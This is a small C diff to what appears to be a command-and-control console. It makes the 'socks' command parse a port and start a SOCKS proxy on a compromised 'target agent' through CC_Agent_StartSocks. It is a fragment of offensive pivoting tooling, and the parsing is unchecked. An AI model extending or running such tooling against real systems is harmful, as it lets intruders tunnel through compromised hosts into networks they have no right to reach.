@@ -76,7 +76,11 @@ int whileMain(){
         }
         else if(startWith(line,"socks")){
             Printf_OK("Start socks server from target agent");
-            Printf_OK("%s",line);
+            int socksport;
+            sscanf(line,"socks %d",&socksport);
+            Printf_OK("Start Socks from %d port,Server Agent is %d",
+                socksport,agentnow);
+            CC_Agent_StartSocks(agentnow,socksport,10000);
         }
         else{
             Printf_OK("unknow cmd");
